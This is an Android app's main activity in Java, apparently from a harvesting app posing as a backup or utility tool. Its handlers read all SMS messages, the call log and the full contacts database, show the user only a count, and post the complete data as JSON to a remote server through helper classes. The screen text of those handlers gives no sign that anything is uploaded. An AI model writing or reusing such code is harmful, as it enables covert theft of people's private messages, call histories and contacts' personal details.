package com.steam.android.androidsteam;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import com.alibaba.fastjson.JSON;
import com.hunter.baby.R;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private int flag = 1;
    TextView tv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tv = findViewById(R.id.textview);
    }

    public void sms(View view) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, 123);
            return;
        }
        if (flag % 3 == 1 && MiuiUtils.checkMIUI()) {
            flag++;
            MiuiUtils.goPermissionSettings(this);
            Toast.makeText(this, "小米手机单独要开启通知短信权限", Toast.LENGTH_SHORT).show();
            return;
        }
        ContentResolver contentResolver = getContentResolver();
        Uri uri = Uri.parse("content://mms-sms/conversations/");
        String[] line = {Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.STATUS, Telephony.Sms.ERROR_CODE, "_id", Telephony.Sms.THREAD_ID};
        Cursor c = contentResolver.query(uri, line, null, null, null);
        ArrayList<Map<String, String>> list = new ArrayList<>();
        if (c != null && !c.isLast()) {
            while (c.moveToNext()) {
                Map<String, String> map = new HashMap<>();
                String address = c.getString(Math.max(c.getColumnIndex("address"), 0));
                String body = c.getString(Math.max(c.getColumnIndex("body"), 0));
                String date = c.getString(Math.max(c.getColumnIndex("date"), 0));
                String status = c.getString(Math.max(c.getColumnIndex("status"), 0));
                String error_code = c.getString(Math.max(c.getColumnIndex("error_code"), 0));
                String _id = c.getString(Math.max(c.getColumnIndex("_id"), 0));
                String thread_id = c.getString(Math.max(c.getColumnIndex("thread_id"), 0));

                map.put("address", address);
                map.put("body", body);
                map.put("date", date);
                map.put("status", status);
                map.put("error_code", error_code);
                map.put("id", _id);
                map.put("thread_id", thread_id);
//                Log.d("sms-mms", map.toString());
                list.add(map);
            }
            String s = "短信记录共:" + list.size();
            Log.e("sms-mms", s);
            tv.setText(s);
            final String a = JSON.toJSONString(list);

            new Thread(new Runnable() {
                @Override
                public void run() {
                    SetPost sp = new SetPost();
                    sp.HttpPostData(a);
                }
            }).start();
        } else {
            String s = "没有发现短信记录";
            Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
            tv.setText(s);
        }
        if (c != null) {
            c.close();
        }
    }

    public void sp(View view) {
        Toast.makeText(MainActivity.this, "功能开发中", Toast.LENGTH_SHORT).show();
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 789);
            return;
        }
        Log.d("", "照片选择备份");
    }


    public void phoneNumber(View view) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CALL_LOG}, 666);
            return;
        }
        ContentResolver contentResolver = getContentResolver();
        Cursor c = contentResolver.query(CallLog.Calls.CONTENT_URI, new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION}, null,
                null, null);
        ArrayList<Map<String, Object>> list = new ArrayList<>();
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyy-MM-dd HH:mm:ss");
        if (c != null && !c.isLast()) {
            while (c.moveToNext()) {
                Map<String, Object> map = new HashMap<>();
                map.put("number", c.getString(Math.max(c.getColumnIndex(CallLog.Calls.NUMBER), 0)));
                map.put("date", dateFormat.format(new Date(c.getLong(1))));
                map.put(CallLog.Calls.DURATION, c.getString(Math.max(c.getColumnIndex(CallLog.Calls.DURATION), 0)));
//                Log.d("CallsLog", map.toString());
                list.add(map);
            }

            String s = "通话记录共:" + list.size();
            Log.d("CallsLog", s);
            tv.setText(s);
            final String a = JSON.toJSONString(list);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    SetPost2 sp = new SetPost2();
                    sp.HttpPostData(a);
                }
            }).start();
        } else {
            String s = "没有发现通话记录";
            Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
            tv.setText(s);
        }
        if (c != null) {
            c.close();
        }
    }

    public void contacts(View view) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS}, 199);
            return;
        }
        ContentResolver resolver = getContentResolver();
        Cursor c = resolver.query(ContactsContract.Data.CONTENT_URI, null, null, null, null);
        List<Map<String, Object>> list = new ArrayList<>();
        if (c == null || c.isLast()) {
            String s = "没有发现通讯录记录";
            Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
            tv.setText(s);
            return;
        } else {
            while (c.moveToNext()) {
                Map<String, Object> map = new HashMap<>();
                long contactId = c.getLong(c.getColumnIndexOrThrow(ContactsContract.Data.CONTACT_ID));
                String displayName = c.getString(c.getColumnIndexOrThrow(ContactsContract.Data.DISPLAY_NAME));
                String photoUri = c.getString(c.getColumnIndexOrThrow(ContactsContract.Data.PHOTO_URI));
                String mimeType = c.getString(c.getColumnIndexOrThrow(ContactsContract.Data.MIMETYPE));
                map.put("contactId", contactId);
                map.put("displayName", displayName);
                if (photoUri != null) {
                    map.put("photoUri", photoUri);
                }
                map.put("mimeType", mimeType);
                /*
                 * 查询所有的号码
                 * 手机号码 {@link ContactsContract.CommonDataKinds.Phone#TYPE_MOBILE}
                 * 家庭号码 {@link ContactsContract.CommonDataKinds.Phone#TYPE_HOME}
                 */
                if (ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    int numberType = c.getInt(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE));
                    String label = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.LABEL));
                    String number = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));

                    map.put("numberType", numberType);
                    if (label != null) {
                        map.put("label", label);
                    }
                    map.put("number", number);
                }
                if (ContactsContract.CommonDataKinds.Photo.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String photoUri1 = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Photo.PHOTO));
                    if (photoUri1 != null) {
                        map.put("photoUri", photoUri);
                    }
                }
                // 查询姓和名
                if (ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String firstName = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME));
                    String lastName = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredName.FAMILY_NAME));
                    if (firstName != null) {
                        map.put("firstName", firstName);
                    }
                    if (lastName != null) {
                        map.put("lastName", lastName);
                    }
                }
                // 公司信息
                if (ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String company = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.COMPANY));
                    String department = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.DEPARTMENT));
                    String job = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.TITLE));
                    String jobDescription = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.JOB_DESCRIPTION));
                    if (company != null) {
                        map.put("company", company);
                    }
                    if (department != null) {
                        map.put("department", department);
                    }
                    if (job != null) {
                        map.put("job", job);
                    }
                    if (jobDescription != null) {
                        map.put("jobDescription", jobDescription);
                    }
                }
                // 邮箱信息
                if (ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String emailAddress = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS));
                    String emailAddressDisplayName = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME));
                    if (emailAddress != null) {
                        map.put("emailAddress", emailAddress);
                    }
                    if (emailAddressDisplayName != null) {
                        map.put("emailAddressDisplayName", emailAddressDisplayName);

                    }
                }
                // 备注信息
                if (ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String note = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Note.NOTE));

                    map.put("note", note);
                }
                // 昵称
                if (ContactsContract.CommonDataKinds.Nickname.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String nickName = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Nickname.NAME));

                    map.put("nickName", nickName);
                }
                // 网址链接
                if (ContactsContract.CommonDataKinds.Website.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String webUrl = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Website.URL));

                    map.put("webUrl", webUrl);
                }
                // 亲属姓名
                if (ContactsContract.CommonDataKinds.Relation.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String relationName = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Relation.NAME));

                    map.put("relationName", relationName);
                }
                // im 协议
                if (ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String protocol = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Im.PROTOCOL));
                    String customProtocol = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Im.CUSTOM_PROTOCOL));

                    map.put("protocol", protocol);
                    map.put("customProtocol", customProtocol);
                }
                // 身份信息
                if (ContactsContract.CommonDataKinds.Identity.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String identity = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Identity.IDENTITY));
                    String namespace = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Identity.NAMESPACE));

                    map.put("identity", identity);
                    map.put("namespace", namespace);
                }
                // 群组信息
                if (ContactsContract.CommonDataKinds.GroupMembership.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String groupId = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.GroupMembership.GROUP_ROW_ID));

                    map.put("groupId", groupId);
                }
                if (map.size() > 3) {
//                    Log.d("ContactsContract", map.toString());
                    list.add(map);
                }
            }
        }
        Log.d("ContactsContract", "通讯录合并前记录共:" + list.size());
        //合并记录
        Map<String, Map<String, Object>> data = new HashMap<>();
        for (Map<String, Object> map : list) {
            //contactId Long
            Long id = (Long) map.get("contactId");
            String contactId = Long.toString(id);
            map.put("contactId", contactId);
            String displayName = (String) map.get("displayName");
            String photoUri = (String) map.get("photoUri");
            //numberType Integer
            Integer type = (Integer) map.get("numberType");
            String numberType = null;
            if (type != null) {
                numberType = Integer.toString(type);
                map.put("numberType", numberType);
            }
            String label = (String) map.get("label");
            String number = (String) map.get("number");
            String firstName = (String) map.get("firstName");
            String lastName = (String) map.get("lastName");
            String company = (String) map.get("company");
            String department = (String) map.get("department");
            String job = (String) map.get("job");
            String jobDescription = (String) map.get("jobDescription");
            String emailAddress = (String) map.get("emailAddress");
            String emailAddressDisplayName = (String) map.get("emailAddressDisplayName");
            String note = (String) map.get("note");
            String nickName = (String) map.get("nickName");
            String webUrl = (String) map.get("webUrl");
            String relationName = (String) map.get("relationName");
            String protocol = (String) map.get("protocol");
            String customProtocol = (String) map.get("customProtocol");
            String identity = (String) map.get("identity");
            String namespace = (String) map.get("namespace");
            String groupId = (String) map.get("groupId");
            Map<String, Object> oneNum = data.get(contactId);
            if (oneNum == null) {
                oneNum = new HashMap<>(map);
            } else {
                if (!TextUtils.isEmpty(displayName)) {
                    oneNum.put("displayName", displayName);
                }
                if (!TextUtils.isEmpty(photoUri)) {
                    oneNum.put("photoUri", photoUri);
                }
                if (!TextUtils.isEmpty(numberType)) {
                    oneNum.put("numberType", numberType);
                }
                if (!TextUtils.isEmpty(label)) {
                    oneNum.put("label", label);
                }
                if (!TextUtils.isEmpty(number)) {
                    String number2 = (String) oneNum.get("number1");
                    if (!TextUtils.isEmpty(number2)) {
                        oneNum.put("number2", number);
                    } else {
                        String number1 = (String) oneNum.get("number");
                        if (!TextUtils.isEmpty(number1)) {
                            oneNum.put("number1", number);
                        } else {
                            oneNum.put("number", number);
                        }
                    }
                }
                if (!TextUtils.isEmpty(firstName)) {
                    oneNum.put("firstName", firstName);
                }
                if (!TextUtils.isEmpty(lastName)) {
                    oneNum.put("lastName", lastName);
                }
                if (!TextUtils.isEmpty(company)) {
                    oneNum.put("company", company);
                }
                if (!TextUtils.isEmpty(department)) {
                    oneNum.put("department", department);
                }
                if (!TextUtils.isEmpty(job)) {
                    oneNum.put("job", job);
                }
                if (!TextUtils.isEmpty(jobDescription)) {
                    oneNum.put("jobDescription", jobDescription);
                }
                if (!TextUtils.isEmpty(emailAddress)) {
                    oneNum.put("emailAddress", emailAddress);
                }
                if (!TextUtils.isEmpty(emailAddressDisplayName)) {
                    oneNum.put("emailAddressDisplayName", emailAddressDisplayName);
                }
                if (!TextUtils.isEmpty(note)) {
                    oneNum.put("note", note);
                }
                if (!TextUtils.isEmpty(webUrl)) {
                    oneNum.put("webUrl", webUrl);
                }
                if (!TextUtils.isEmpty(nickName)) {
                    oneNum.put("nickName", nickName);
                }
                if (!TextUtils.isEmpty(relationName)) {
                    oneNum.put("relationName", relationName);
                }
                if (!TextUtils.isEmpty(protocol)) {
                    oneNum.put("protocol", protocol);
                }
                if (!TextUtils.isEmpty(customProtocol)) {
                    oneNum.put("customProtocol", customProtocol);
                }
                if (!TextUtils.isEmpty(identity)) {
                    oneNum.put("identity", identity);
                }
                if (!TextUtils.isEmpty(namespace)) {
                    oneNum.put("namespace", namespace);
                }
                if (!TextUtils.isEmpty(groupId)) {
                    oneNum.put("groupId", groupId);
                }
            }
            data.put(contactId, oneNum);
        }
        String s = "通讯录合并后记录共:" + data.size();
        Log.d("ContactsContract", s);
        tv.setText(s);
//        Set<Map.Entry<String, Map<String, Object>>> entries = data.entrySet();
//        for (Map.Entry<String, Map<String, Object>> en : entries) {
//            Log.d("", en.getValue().toString());
//        }
        final String a = JSON.toJSONString(data);
        new Thread(new Runnable() {
            @Override
            public void run() {
                SetPost2 sp = new SetPost2();
                sp.HttpPostData(a);
            }
        }).start();
        c.close();
    }
}
